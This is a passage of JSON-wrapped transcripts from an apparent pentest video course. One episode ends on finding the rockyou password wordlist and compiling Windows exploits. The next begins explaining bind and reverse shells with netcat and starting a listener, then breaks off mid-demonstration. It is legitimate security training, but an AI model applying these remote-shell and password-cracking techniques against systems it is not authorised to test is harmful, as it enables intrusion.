--> 00:42:22.035\nCuz they can get extensive.\n\n898\n00:42:22.035 --> 00:42:23.270\n&gt;&gt; [LAUGH]\n&gt;&gt; And you go and look,\n\n899\n00:42:23.270 --> 00:42:27.440\nthey're found, rockyou is in\n/root/attack!/Password_Stuff/rockyou.txt.\n\n900\n00:42:27.440 --> 00:42:31.020\nIt's also in\nusr/share/wordlists/rockyou.txt.\n\n901\n00:42:31.020 --> 00:42:37.372\nSo you can also use locate,\nokay, to rockyou.txt, like that.\n\n902\n00:42:37.372 --> 00:42:41.260\nAnd you'll see it found all those as well.\n\n903\n00:42:41.260 --> 00:42:43.489\nI think it actually found one more,\nthere it is.\n\n904\n00:42:43.489 --> 00:42:48.959\nBecause it had .tar, .gz, so\nit did a little better job, locate.\n\n905\n00:42:48.959 --> 00:42:53.150\nYou'll probably use both from time to\ntime, so get familiar with both of those.\n\n906\n00:42:53.150 --> 00:42:56.330\nSearching and finding, all right,\nwhat about Windows, what about Mac?\n\n907\n00:42:57.750 --> 00:42:59.080\nThey all have their own tools.\n\n908\n00:42:59.080 --> 00:43:04.995\nA lot of the best tools running out\naround out there are ported to Windows.\n\n909\n00:43:04.995 --> 00:43:07.415\nThey are ported to Macs, many of them are.\n\n910\n00:43:07.415 --> 00:43:10.178\nSo they're not out in the weeds\ncompletely, things like nmap are there.\n\n911\n00:43:10.178 --> 00:43:14.885\nThere's a great all-in-one tool\ncalled CanEnable, fantastic tool.\n\n912\n00:43:14.885 --> 00:43:16.285\nPlay with that, it's fun.\n\n913\n00:43:18.255 --> 00:43:22.760\nBut typically not what we're gonna do for\nour platform for hacking.\n\n914\n00:43:22.760 --> 00:43:26.840\nYou can do some, but\neverything isn't quite there.\n\n915\n00:43:26.840 --> 00:43:29.792\nYou will need it for testing,\nwe'll need to build sandboxes, right?\n\n916\n00:43:29.792 --> 00:43:32.010\nI'm gonna be attacking Windows\nmachine from time to time.\n\n917\n00:43:32.010 --> 00:43:34.712\nI don't know about you, I don't go,\nwell, its a Windows machine,\n\n918\n00:43:34.712 --> 00:43:36.028\nI guess I'm gonna leave it alone.\n\n919\n00:43:36.028 --> 00:43:38.880\nNo, I want to get into\nthose boxes as well.\n\n920\n00:43:38.880 --> 00:43:42.260\nSo it's good to have one laying around for\ntesting purposes,\n\n921\n00:43:42.260 --> 00:43:45.913\nattack platform purposes,\njust depending on what you wanna run.\n\n922\n00:43:45.913 --> 00:43:47.360\nWe also wanna talk about that.\n\n923\n00:43:50.514 --> 00:43:53.465\nYeah, everything's good,\nit's a necessary platform,\n\n924\n00:43:53.465 --> 00:43:56.947\ntypically, in my environment as\na Pintester, I'm gonna have a Mac,\n\n925\n00:43:56.947 --> 00:43:59.912\nI'm gonna have a Linux, and\nI'm gonna have a Windows box.\n\n926\n00:43:59.912 --> 00:44:02.356\nJust so that I can work interoperably,\n\n927\n00:44:02.356 --> 00:44:05.700\nregardless of what system\nmay come down my pipe here.\n\n928\n00:44:05.700 --> 00:44:07.140\nAnd the same thing goes with Mac, right?\n\n929\n00:44:07.140 --> 00:44:10.949\nJust take all that stuff I said about\nWindows and throw it on top of Mac.\n\n930\n00:44:10.949 --> 00:44:14.329\n&gt;&gt; Yeah, when we start getting into\ncompiling our own exploits because of\n\n931\n00:44:14.329 --> 00:44:17.711\nthe libraries that are there and\nnot there on other operating systems,\n\n932\n00:44:17.711 --> 00:44:21.285\nI need a Windows machine to compile\nthose Windows exploits to attack that.\n\n933\n00:44:21.285 --> 00:44:25.929\nI can't do that on my Linus fox, well,\nnot very easily [LAUGH] can be done, but\n\n934\n00:44:25.929 --> 00:44:30.432\nit helps to have that Windows system\naround, so that you can, as you said,\n\n935\n00:44:30.432 --> 00:44:33.812\ntest against it, compile on it,\nstill have to have it.\n\n936\n00:44:33.812 --> 00:44:35.287\n&gt;&gt; Yeah.\n&gt;&gt; Windows, go Windows.\n\n937\n00:44:35.287 --> 00:44:37.730\n&gt;&gt; That's right,\nit's not in the lease, man.\n\n938\n00:44:37.730 --> 00:44:41.895\nYou gotta have your Windows system because\nyou'll see, as we continue down this road,\n\n939\n00:44:41.895 --> 00:44:44.585\nyou'll go, wow, it's a good thing he's\ngot that Windows box laying right there.\n\n940\n00:44:44.585 --> 00:44:46.945\nCuz otherwise we'd be just sitting\nhere twiddling our thumbs,\n\n941\n00:44:46.945 --> 00:44:49.008\nwhich does not make for\ngreat TV, to be honest with you.\n\n942\n00:44:49.008 --> 00:44:50.460\nIt's a little boring.\n\n943\n00:44:50.460 --> 00:44:53.220\nWell Mike, that's the basics.\n\n944\n00:44:53.220 --> 00:44:57.238\nAnything didn't sound familiar to you,\nrun out to the interwebs,\n\n945\n00:44:57.238 --> 00:45:00.351\nfind out about it,\nread ManPages, watch ITProTV.\n\n946\n00:45:00.351 --> 00:45:04.070\nWe have a laundry list of courses that\nwill get you up to snuff for that,\n\n947\n00:45:04.070 --> 00:45:07.476\nso if anything sounds weird, or\nyou're just not strong, go and\n\n948\n00:45:07.476 --> 00:45:11.700\nmake sure that you buff those\nskills down to a fine perfection.\n\n949\n00:45:11.700 --> 00:45:13.220\n&gt;&gt; All right, Daniel, thank you for\n\n950\n00:45:13.220 --> 00:45:16.736\nthat great look at what we're gonna be\ngetting into as this series progresses,\n\n951\n00:45:16.736 --> 00:45:19.890\na really good look at some of the basics\nthat we need to be familiar with.\n\n952\n00:45:19.890 --> 00:45:23.500\nAnd as Daniel said, at this point, if any\nof those don't sound familiar or you're\n\n953\n00:45:23.500 --> 00:45:27.110\nnot comfortable with them, good time to\nstop and go back and refresh on those.\n\n954\n00:45:27.110 --> 00:45:30.250\nSo that as we go through this series,\nyou'll be able to follow along and\n\n955\n00:45:30.250 --> 00:45:32.110\ndo the things that we're gonna do.\n\n956\n00:45:32.110 --> 00:45:34.710\nOr put it off, watch the whole series,\nand then go back and\n\n957\n00:45:34.710 --> 00:45:37.260\nwatch it again, taking one, two at a time.\n\n958\n00:45:37.260 --> 00:45:38.770\nWhatever floats your boat,\n\n959\n00:45:38.770 --> 00:45:43.180\nbut just know that we've got the resources\nhere at ITProTV for you to enjoy.\n\n960\n00:45:43.180 --> 00:45:44.830\nSo we appreciate that, Daniel.\n\n961\n00:45:44.830 --> 00:45:47.120\nHope everybody out there\nenjoyed watching this one.\n\n962\n00:45:47.120 --> 00:45:50.060\nSigning off for ITProTV,\nI've been your host, Mike Rodrick.\n\n963\n00:45:50.060 --> 00:45:50.890\n&gt;&gt; And I'm Daniel Lowrie.\n\n964\n00:45:50.890 --> 00:45:52.102\n&gt;&gt; And we'll see you next time.\n\n965\n00:45:52.102 --> 00:45:58.530\n[MUSIC]\n\n966\n00:45:58.530 --> 00:46:01.646\n&gt;&gt; Thank you for watching ITProTV.\n\n",
          "vimeoId": "202062475"
        },
        {
          "description": "In this episode, Dan and Mike demonstrate creating remote shells. They compare and contrast BIND and reverse shells. They show how to use netcat and the NMAP's ncat.",
          "length": "2282",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-2-1-remote_shells-013017-PGM.00_37_48_01.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-2-1-remote_shells-013017-PGM.00_37_48_01.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-2-1-remote_shells-013017-PGM.00_37_48_01.Still001-sm.jpg",
          "title": "Remote Shells",
          "transcript": "WEBVTT\n\n1\n00:00:00.260 --> 00:00:03.505\nWelcome to ITProTV,\nI'm your host Don Pezet.\n\n2\n00:00:03.505 --> 00:00:06.983\n[CROSSTALK]\n\n3\n00:00:06.983 --> 00:00:08.693\n[MUSIC]\n\n4\n00:00:08.693 --> 00:00:10.942\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:10.942 --> 00:00:15.284\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:15.284 --> 00:00:19.680\nI'm your host, Mike Rodrick, and\ntoday we're doing penetration testing.\n\n7\n00:00:19.680 --> 00:00:23.920\nAnd in this episode we're gonna be taking\na look at shells and remote shells.\n\n8\n00:00:23.920 --> 00:00:26.755\nSo, Daniel,\nI guess we're going to the beach today?\n\n9\n00:00:26.755 --> 00:00:27.770\n&gt;&gt; [LAUGH] Exactly right.\n\n10\n00:00:27.770 --> 00:00:30.990\nEverybody get your flip flops and\nyour sun tan lotion, cuz,\n\n11\n00:00:30.990 --> 00:00:33.325\nno, we're not going to the beach today,\nMichael.\n\n12\n00:00:33.325 --> 00:00:35.150\n&gt;&gt; [LAUGH]\n&gt;&gt; He's having fun, right?\n\n13\n00:00:35.150 --> 00:00:36.860\nWe like to have a good time around here.\n\n14\n00:00:36.860 --> 00:00:39.700\nWhat are we talking about\nwhen he says shells?\n\n15\n00:00:39.700 --> 00:00:43.320\nCuz that's what today's topic is about,\nremote shells and shells in general.\n\n16\n00:00:43.320 --> 00:00:46.260\nNot the cool little things\nyou find on the beach.\n\n17\n00:00:46.260 --> 00:00:51.010\nThe interface that you work\nwith inside a Linux system.\n\n18\n00:00:51.010 --> 00:00:56.630\nAnd technically I think Windows as well is\nalso called a shell, is that environment,\n\n19\n00:00:56.630 --> 00:00:58.460\nthat black box environment right?\n\n20\n00:00:58.460 --> 00:00:59.900\nThat's what you're thinking of.\n\n21\n00:00:59.900 --> 00:01:02.620\nThere's a graphical shell which is\nit gives you all the pretty GUI's.\n\n22\n00:01:02.620 --> 00:01:07.580\nBut at its core, we're gonna be\nworking a lot with black boxes, right?\n\n23\n00:01:07.580 --> 00:01:11.180\nWith command prompt and\nthe command line in Linux.\n\n24\n00:01:11.180 --> 00:01:12.970\nSo that is typically know as shell.\n\n25\n00:01:12.970 --> 00:01:15.060\nWell you think of BASH right?\n\n26\n00:01:15.060 --> 00:01:16.090\nBASH scripting.\n\n27\n00:01:16.090 --> 00:01:17.310\nWhat does BASH stand for?\n\n28\n00:01:17.310 --> 00:01:19.780\nBASH stands for born again shell.\n\n29\n00:01:19.780 --> 00:01:24.080\nSo that's what we mean we're talking\nabout shell is an environment\n\n30\n00:01:24.080 --> 00:01:26.950\nwhich interfaces with\nthe kernel of your system.\n\n31\n00:01:26.950 --> 00:01:28.750\nTypically command based.\n\n32\n00:01:28.750 --> 00:01:29.440\nOkay.\n\n33\n00:01:29.440 --> 00:01:31.410\nSo that's what a shell is.\n\n34\n00:01:31.410 --> 00:01:33.040\nSo now that we know what a shell is,\n\n35\n00:01:33.040 --> 00:01:37.580\nwe can probably guess on what we\nmean by when we say remote shell.\n\n36\n00:01:37.580 --> 00:01:42.950\nIf I want to access Mike's computer,\nI'm probably doing\n\n37\n00:01:42.950 --> 00:01:46.700\nsomething inside of my own shell, and now\nI want to get a shell on Mike's computer.\n\n38\n00:01:46.700 --> 00:01:50.700\nI want to have access through\nthat terminal environment.\n\n39\n00:01:50.700 --> 00:01:54.050\nAnd that would be remotely, because I'm\nnot directly sitting behind the keyboard,\n\n40\n00:01:54.050 --> 00:01:57.000\nand mouse, and\nmonitor that's plugged into that system.\n\n41\n00:01:57.000 --> 00:02:01.080\nI'm remotely accessing it typically\nthrough a ethernet network of some sort,\n\n42\n00:02:01.080 --> 00:02:02.700\nor the internet, as it were.\n\n43\n00:02:03.890 --> 00:02:05.460\nSo that's what we mean by shells.\n\n44\n00:02:05.460 --> 00:02:07.590\nThat's what we mean by remote shells.\n\n45\n00:02:07.590 --> 00:02:12.230\nNow the cool thing about shells are, is\nthere's many different ways to get them.\n\n46\n00:02:12.230 --> 00:02:13.210\nThere's secure shell.\n\n47\n00:02:13.210 --> 00:02:14.386\nYou can just do SSH.\n\n48\n00:02:14.386 --> 00:02:17.310\nWe saw that in a previous episode,\nvery simple tool.\n\n49\n00:02:17.310 --> 00:02:19.150\nYou should be able to do that.\n\n50\n00:02:19.150 --> 00:02:20.801\nAnd work with SSH, it's a great thing.\n\n51\n00:02:20.801 --> 00:02:28.270\nLot of systems work that very way if\nyou're into AWS, you get an RSA key.\n\n52\n00:02:28.270 --> 00:02:31.472\nSlap that sucker into your box,\nwherever you're logging in from,\n\n53\n00:02:31.472 --> 00:02:33.717\napply it SSH into the IP\naddress they gave you and\n\n54\n00:02:33.717 --> 00:02:36.430\nthat's how you get access to\nyour Linux machines in AWS.\n\n55\n00:02:36.430 --> 00:02:38.660\nThat's a remote shell.\n\n56\n00:02:40.080 --> 00:02:42.970\nSSH is the tool that allows\nthat connection, right?\n\n57\n00:02:42.970 --> 00:02:46.040\nIt does all the communication,\nthe configuration.\n\n58\n00:02:46.040 --> 00:02:48.750\nIt does all of the encryption,\nthings of that nature.\n\n59\n00:02:50.230 --> 00:02:52.010\nBut it's not the only game in the box,\nright?\n\n60\n00:02:52.010 --> 00:02:56.970\nThere's telnets, there's old r log in,\nthat's a typical way,\n\n61\n00:02:56.970 --> 00:03:02.270\nI said typical, it's not typical anymore,\nit's an old way to do remote log in,\n\n62\n00:03:02.270 --> 00:03:05.150\nthat's what r log in stands for,\nremote log in.\n\n63\n00:03:05.150 --> 00:03:06.410\nWe're doing remote shells,\n\n64\n00:03:06.410 --> 00:03:10.830\nwe're accessing machines from our\nlocal machine that are remote to us.\n\n65\n00:03:10.830 --> 00:03:14.610\nSo that being said I'm going to\nintroduce you to a wonderful tool.\n\n66\n00:03:14.610 --> 00:03:16.670\nIt has been known as\nthe Swiss Army knife and\n\n67\n00:03:16.670 --> 00:03:19.410\nI believe that' even in the man\npages to be honest with you.\n\n68\n00:03:20.450 --> 00:03:24.970\nThe Swiss Army knife of networking\nof systems administration.\n\n69\n00:03:24.970 --> 00:03:26.730\nIt's a fantastic tool.\n\n70\n00:03:26.730 --> 00:03:29.060\nIt can do so many things.\n\n71\n00:03:29.060 --> 00:03:32.780\nAnd we're gonna use it extensively\ninside of this series,\n\n72\n00:03:32.780 --> 00:03:35.490\nso get ready to get used to it.\n\n73\n00:03:35.490 --> 00:03:39.150\nAnd learn to use it and trust me,\nit's not like, no, not this thing again.\n\n74\n00:03:39.150 --> 00:03:41.860\nYou're gonna be like sweet,\nwe're getting out netcat.\n\n75\n00:03:41.860 --> 00:03:43.380\nNetcat is the tool.\n\n76\n00:03:43.380 --> 00:03:44.620\nSo what is netcat?\n\n77\n00:03:44.620 --> 00:03:49.120\nNetcat is the network,\nlet's see what their man page,\n\n78\n00:03:49.120 --> 00:03:52.450\nlet's jump to my computer really quickly,\nman netcat.\n\n79\n00:03:52.450 --> 00:03:57.660\nOr actually, nc,\nas it typically comes bundled.\n\n80\n00:03:57.660 --> 00:03:59.130\nHit return.\n\n81\n00:03:59.130 --> 00:04:02.500\nThere you go, TCP/IP swiss army knife.\n\n82\n00:04:02.500 --> 00:04:08.830\nIt enables us to make basically any kind\nof TCP/IP connection, or UDP connection.\n\n83\n00:04:08.830 --> 00:04:11.420\nIt doesn't matter what\nservices are on there.\n\n84\n00:04:11.420 --> 00:04:14.020\nThe netcat will try to talk to it.\n\n85\n00:04:14.020 --> 00:04:16.100\nIt loves to to make connections.\n\n86\n00:04:16.100 --> 00:04:16.830\nIt's a people person.\n\n87\n00:04:17.860 --> 00:04:19.380\nIt really likes to do this.\n\n88\n00:04:19.380 --> 00:04:21.140\nAnd it does it very well.\n\n89\n00:04:21.140 --> 00:04:21.650\nI like it.\n\n90\n00:04:21.650 --> 00:04:23.120\nWhen we get into the banner grabbing and\n\n91\n00:04:23.120 --> 00:04:26.110\nstuff like that back in\nthe day Telnet was the tool.\n\n92\n00:04:26.110 --> 00:04:28.000\nBut netcat is really the tool.\n\n93\n00:04:28.000 --> 00:04:31.450\nSo forget using Telnet I'm\nnot saying forget it.\n\n94\n00:04:31.450 --> 00:04:33.820\nNetcat is typically where you're gonna go.\n\n95\n00:04:33.820 --> 00:04:37.440\nEvery now and then you might have to\ndust off Telnet for whatever reason,\n\n96\n00:04:37.440 --> 00:04:38.440\nI can't think of any.\n\n97\n00:04:38.440 --> 00:04:40.122\nBut I wanna leave myself\nsome room to wiggle.\n\n98\n00:04:40.122 --> 00:04:41.620\n&gt;&gt; Yes.\n&gt;&gt; [LAUGH] Not get locked in.\n\n99\n00:04:41.620 --> 00:04:44.170\nHey now, I know that Netcat can't do this.\n\n100\n00:04:44.170 --> 00:04:45.660\nI don't wanna get stuck in that box,\nright?\n\n101\n00:04:45.660 --> 00:04:47.030\nAnd so, Netcat's a great tool.\n\n102\n00:04:47.030 --> 00:04:49.170\nThat's basically what I'm trying to say.\n\n103\n00:04:49.170 --> 00:04:50.230\nNetcat's a great tool.\n\n104\n00:04:50.230 --> 00:04:53.480\nWe can use it to create\nremote connections,\n\n105\n00:04:53.480 --> 00:04:55.220\ntransfer files, things of that.\n\n106\n00:04:55.220 --> 00:04:58.060\nIt's very, very, very robust.\n\n107\n00:04:58.060 --> 00:05:01.260\nIt has a lot of features and\nit's really simple to use.\n\n108\n00:05:01.260 --> 00:05:02.050\nSpecifically for\n\n109\n00:05:02.050 --> 00:05:05.960\nour purposes we're just going to talk\nabout creating different types of shells.\n\n110\n00:05:07.180 --> 00:05:09.430\nSo what do you mean\ndifferent types of shells?\n\n111\n00:05:09.430 --> 00:05:10.600\n&gt;&gt; That was my question Daniel.\n\n112\n00:05:10.600 --> 00:05:13.072\nNow you're telling me there's\nmore than one type of shell.\n\n113\n00:05:13.072 --> 00:05:13.960\n&gt;&gt; Yeah, yeah.\n\n114\n00:05:13.960 --> 00:05:21.310\nAnd I don't mean bash versus seashell or\nr-shell versus z-shell or core shell.\n\n115\n00:05:21.310 --> 00:05:23.780\nThat is different types of shells, but\n\n116\n00:05:23.780 --> 00:05:28.890\nwhat I mean is there's two different\ntypes of shell connections we can create.\n\n117\n00:05:28.890 --> 00:05:30.530\nOne is called a bind shell.\n\n118\n00:05:30.530 --> 00:05:32.710\nAnd the other is a reverse shell.\n\n119\n00:05:32.710 --> 00:05:34.790\nThis is an important concept\nthat you need to grasp.\n\n120\n00:05:34.790 --> 00:05:35.520\nOkay?\n\n121\n00:05:35.520 --> 00:05:39.560\nSo, we wanna make sure that you\nunderstand by the end of this episode.\n\n122\n00:05:39.560 --> 00:05:41.690\nI can say, hey,\ncreate a reverse shell, and\n\n123\n00:05:41.690 --> 00:05:43.600\nyou'll know exactly\nwhat I'm talking about.\n\n124\n00:05:43.600 --> 00:05:46.270\nWhat you need to do is just\npop a bind shell there.\n\n125\n00:05:46.270 --> 00:05:49.040\nAnd you're like, yeah, not a problem,\nI can do that really quickly.\n\n126\n00:05:49.040 --> 00:05:51.480\nBecause I know netcat,\nI know what a bind shell is, and\n\n127\n00:05:51.480 --> 00:05:53.360\nI know how to make netcat do a bind shell.\n\n128\n00:05:53.360 --> 00:05:57.440\nThat's where I want you end of\ntoday's episode right here.\n\n129\n00:05:57.440 --> 00:06:02.130\nSo, that being said, let's look how we\njust create a connection using Netcap.\n\n130\n00:06:02.130 --> 00:06:03.340\nSo let's go back to my computer.\n\n131\n00:06:03.340 --> 00:06:05.290\nWe want to quit out of the Manpage.\n\n132\n00:06:05.290 --> 00:06:08.180\nNow, all you have to do is type in NC for\nNetcap.\n\n133\n00:06:09.660 --> 00:06:15.720\nAnd then, this a server type service, so\nyou're going to have a client an a server.\n\n134\n00:06:15.720 --> 00:06:19.810\nSo we'll make the Linux box the server,\nhow about that?\n\n135\n00:06:19.810 --> 00:06:20.730\nWe'll start there.\n\n136\n00:06:20.730 --> 00:06:23.970\nI also have, hey look,\nWindows 7 right there waiting for us.\n\n137\n00:06:23.970 --> 00:06:28.130\nI'm using Windows 7 just for,\nI know you're like hey Windows 10 is out,\n\n138\n00:06:28.130 --> 00:06:32.260\nwhat is this man,\nanybody can hack into a Windows 7 machine.\n\n139\n00:06:32.260 --> 00:06:34.305\nA, no they can't.\n\n140\n00:06:34.305 --> 00:06:34.930\n&gt;&gt; [LAUGH].\n&gt;&gt; Okay,\n\n141\n00:06:34.930 --> 00:06:37.270\nb yes I know Windows 10 is not there, but\n\n142\n00:06:37.270 --> 00:06:41.690\nI want to make sure that everything\nwe're doing is easily demonstrated.\n\n143\n00:06:41.690 --> 00:06:44.060\nNot that you can't\ndemonstrate in Windows 10.\n\n144\n00:06:44.060 --> 00:06:46.900\nWindows 10 does have more security\nfeatures built into it, so\n\n145\n00:06:46.900 --> 00:06:48.250\nit becomes more difficult.\n\n146\n00:06:48.250 --> 00:06:49.580\nNot that it can't be done.\n\n147\n00:06:49.580 --> 00:06:50.670\nJust that they're more difficult.\n\n148\n00:06:50.670 --> 00:06:52.440\nYou have to make more caveats.\n\n149\n00:06:52.440 --> 00:06:56.150\nI wanna show you the concepts so\nthat we can do those things\n\n150\n00:06:56.150 --> 00:06:58.920\nwithout the hinderance of Windows\n10 trying to stop me, all right?\n\n151\n00:06:58.920 --> 00:07:00.520\nSo that's why I want Windows 7.\n\n152\n00:07:00.520 --> 00:07:03.560\nAll right, so let's set up the server,\n\n153\n00:07:03.560 --> 00:07:07.050\nand then we'll go to the Windows\nmachine and we'll do the client.\n\n154\n00:07:07.050 --> 00:07:09.910\nAnd then, for grids and giggles when\nwe're done We'll reverse the process.\n\n155\n00:07:09.910 --> 00:07:14.470\nWe'll make the Windows client,\nI'll make the Windows operator our server.\n\n156\n00:07:14.470 --> 00:07:15.620\nAnd a Linux our client.\n\n157\n00:07:15.620 --> 00:07:16.850\nSo let's start here.\n\n158\n00:07:16.850 --> 00:07:17.690\nSo let's create -nlvp.\n\n159\n00:07:17.690 --> 00:07:19.290\nWow that's a lot of stuff man.\n\n160\n00:07:20.430 --> 00:07:23.690\nWhat does that mean?\n\n161\n00:07:23.690 --> 00:07:26.270\nWell, basically it means\nSet me up as a server.\n\n162\n00:07:28.360 --> 00:07:31.450\nWe want to listen,\nthat's what the l is for.\n\n163\n00:07:31.450 --> 00:07:38.520\nV is for verbosity, and p is for I want to\nsay, you know what, we have a man page.\n\n164\n00:07:38.520 --> 00:07:39.301\nMan n-c.\n\n165\n00:07:39.301 --> 00:07:44.020\nYou can just do dash p, that's the port.\n\n166\n00:07:46.380 --> 00:07:48.600\nYeah so it's asking me for the port.\n\n167\n00:07:48.600 --> 00:07:52.378\nL is for the listening,\nto listen on that port.\n\n168\n00:07:52.378 --> 00:07:54.920\nSo nlvp I forget what -n is.\n\n169\n00:07:54.920 --> 00:07:58.657\n&gt;&gt; That doesn't use any DNS if I'm right,\nit doesn't bother taking time to resolve\n\n170\n00:07:58.657 --> 00:08:01.016\nname\n&gt;&gt; Mike, man this guy.\n\n171\n00:08:01.016 --> 00:08:04.280\nCouldn't ask for a better wingman\non this show to be honest with you.\n\n172\n00:08:04.280 --> 00:08:07.920\nThat's right, it uses numeric IPs only\nas you can see from the screen here.\n\n173\n00:08:07.920 --> 00:08:08.460\nNo DNS.\n\n174\n00:08:08.460 --> 00:08:16.140\nSo I do that a lot because DNS\ncan get hinky if it changes.\n\n175\n00:08:16.140 --> 00:08:19.740\nIt's nice, but I like knowing\nthis is the IP I'm logging into.\n\n176\n00:08:19.740 --> 00:08:21.630\nThat's the machine I'm using.\n\n177\n00:08:21.630 --> 00:08:24.540\nAnd because this is the IP address,\nso I typically stick\n\n178\n00:08:24.540 --> 00:08:28.340\nwith that in case my DNS information\nchanges and goes to another machine.\n\n179\n00:08:28.340 --> 00:08:29.330\nDon't like that.\n\n180\n00:08:29.330 --> 00:08:29.930\nSo I do that.\n\n181\n00:08:29.930 --> 00:08:32.310\nSo NLVP and of course V is the verbosity.\n\n182\n00:08:32.310 --> 00:08:33.590\nSo let me get out of here.\n\n183\n00:08:33.590 --> 00:08:35.608\nSo let's set this up.\n\n184\n00:08:35.608 --> 00:08:37.494\nNc-nlvp.\n\n185\n00:08:37.494 --> 00:08:42.430\nSo now we know its no DNS,\n\n186\n00:08:42.430 --> 00:08:46.632\nsetup a listening service,\nbe verbose, and on said port.\n\n187\n00:08:46.632 --> 00:08:49.340\nWe haven't defined that port yet,\nwe are going to do that now.\n\n188\n00:08:49.340 --> 00:08:50.900\nSo, what port do I want to use?\n\n189\n00:08:50.900 --> 00:08:55.240\nI can use any port that is not\ncurrently in business, right?\n\n190\n00:08:55.240 --> 00:08:57.920\nWe have 65,356 of them, right?\n\n191\n00:08:57.920 --> 00:08:58.840\nIs that the right number?\n\n192\n00:08:58.840 --> 00:08:59.890\n&gt;&gt; I think so.\n\n193\n00:08:59.890 --> 00:09:00.915\n&gt;&gt; There's a lot.\n\n194\n00:09:00.915 --> 00:09:02.450\n65,000 and some odd 500.\n\n195\n00:09:02.450 --> 00:09:04.670\n&gt;&gt; 536.\n&gt;&gt; I always get it backwards.\n\n196\n00:09:04.670 --> 00:09:07.390\n&gt;&gt; Yeah.\n&gt;&gt; It's my dyslexia kicking in.\n\n197\n00:09:07.390 --> 00:09:08.905\nAnd that's not a joke.\n\n198\n00:09:08.905 --> 00:09:11.770\n[LAUGH] That's actually what's happening.\n\n199\n00:09:11.770 --> 00:09:15.100\nSo just pick a port that's not being used.\n\n200\n00:09:15.100 --> 00:09:19.262\nIf I know, if I wanna do port 80, gotta\nmake sure I'm not running a web server\n\n201\n00:09:19.262 --> 00:09:21.510\nfirst cuz they'll probably\nconflict with each other, right?\n\n202\n00:09:21.510 --> 00:09:25.590\nSo just pick a random, I like to use 9999\n\n203\n00:09:25.590 --> 00:09:29.655\nbecause it's typically not a used port,\nand it's easy to type.\n\n204\n00:09:29.655 --> 00:09:31.560\n&gt;&gt; [LAUGH] Exactly.\n&gt;&gt; Yeah, let's be honest, folks.\n\n205\n00:09:31.560 --> 00:09:32.760\n&gt;&gt; Easy to remember, easy to type.\n\n206\n00:09:32.760 --> 00:09:35.720\n&gt;&gt; Easy to remember, easy to type,\nit's not that difficult.\n\n207\n00:09:35.720 --> 00:09:36.720\nMake these things,\n\n208\n00:09:36.720 --> 00:09:39.820\ndon't go around your elbow to get to your\nback, that's the wrong way to do it.\n\n209\n00:09:39.820 --> 00:09:41.380\nDo it the easy way, that's the easy way.\n\n210\n00:09:41.380 --> 00:09:44.480\nIt's easy to type, easy to remember,\nand it's typically not being used.\n\n211\n00:09:44.480 --> 00:09:46.740\nSo that's my drug of choice right there.\n\n212\n00:09:46.740 --> 00:09:49.620\nI hit return, and\nnow it says listening on, it says any,\n\n213\n00:09:49.620 --> 00:09:53.160\nwhat it means is it's listening for\nany connection on port 9999.\n\n214\n00:09:53.160 --> 00:09:56.530\nSitting here waiting patiently, right?\n\n215\n00:09:56.530 --> 00:10:00.320\nLet's go over our Windows machine,\nlet's open a command prompt.\n\n216\n00:10:00.320 --> 00:10:04.080\nActually, I need to check,\nwhen you're in Linux, right?\n\n217\n00:10:04.080 --> 00:10:06.770\nThey have that path variable,\nand so does Windows.\n\n218\n00:10:06.770 --> 00:10:12.920\nThere's a path also for\nuniversally executable binaries, or EXEs.\n\n219\n00:10:14.350 --> 00:10:18.330\nIf you don't have your program\nin one of these directories,\n\n220\n00:10:18.330 --> 00:10:21.560\nyou usually have to append the directory\nname, or you have to move the program.\n\n221\n00:10:21.560 --> 00:10:23.960\nTypically it's easier to move to program,\nto be honest with you.\n\n222\n00:10:23.960 --> 00:10:28.170\nSo I can't remember if I did that or not.\n\n223\n00:10:28.170 --> 00:10:31.014\nSo we'll do that really quickly.\n\n224\n00:10:32.125 --> 00:10:36.825\nGo to C, it will be in Windows,\nand System32.\n\n225\n00:10:36.825 --> 00:10:39.820\nIs an easy one to remember because\nthat's where all the system files are.\n\n226\n00:10:39.820 --> 00:10:43.290\nYou know it's not gonna\ngive you any issues.\n\n227\n00:10:43.290 --> 00:10:45.700\nI wanna see if,\nit will be in alphabetical order.\n\n228\n00:10:47.060 --> 00:10:52.660\nN, got N cat, but not NC,\nman, I gave up the ghost.\n\n229\n00:10:52.660 --> 00:10:57.400\nThere we go, let's grab a copy of that,\nI know I keep, it's ncat.\n\n230\n00:10:57.400 --> 00:11:00.020\nNot ncat Lowrie, net-cat.\n\n231\n00:11:00.020 --> 00:11:00.990\nThere we go, let's copy that.\n\n232\n00:11:02.604 --> 00:11:06.970\nDrop that into that system 32 and paste.\n\n233\n00:11:06.970 --> 00:11:10.730\n&gt;&gt; So again, we could really have run that\nfrom anywhere, but by putting it in some\n\n234\n00:11:10.730 --> 00:11:15.270\nplace that's included in your environment\nvariables makes it a lot easier to work\n\n235\n00:11:15.270 --> 00:11:18.130\nwith from the command line cuz\nyou're not typing out entire paths,\n\n236\n00:11:18.130 --> 00:11:22.420\nyou can just type in C and it's gonna\nlook in those normal places and find it.\n\n237\n00:11:22.420 --> 00:11:25.218\n&gt;&gt; Exactly, Mike, spot on yet again.\n\n238\n00:11:25.218 --> 00:11:30.100\nI don't wanna be typing in or changing\ndirectories into where did I keep net cat?\n\n239\n00:11:30.100 --> 00:11:32.260\nJust drop it in one of\nthose path directories and\n\n240\n00:11:32.260 --> 00:11:34.190\nit's at your leisure when you can use it.\n\n241\n00:11:34.190 --> 00:11:37.580\nNow that it's there I should be\nable to run it very easily if\n\n242\n00:11:37.580 --> 00:11:39.570\nI close these folders.\n\n243\n00:11:39.570 --> 00:11:40.670\nOpen up my command prompt.\n\n244\n00:11:40.670 --> 00:11:42.420\nYou'll notice I didn't\neven do administrative.\n\n245\n00:11:42.420 --> 00:11:44.900\nYou don't have to be\nan administrator to run Net-cat.\n\n246\n00:11:46.030 --> 00:11:47.610\nIt's that simple.\n\n247\n00:11:47.610 --> 00:11:54.210\nSo to create the client connection,\nthat's where we're at, we do NC-NV,\n\n248\n00:11:54.210 --> 00:11:59.930\nbasically IP addresses, no DNS And\nmore verbosity, cuz I like verbosity.\n\n249\n00:11:59.930 --> 00:12:03.110\nI like to see what these things are doing,\nif there's anything to even see.\n\n250\n00:12:03.110 --> 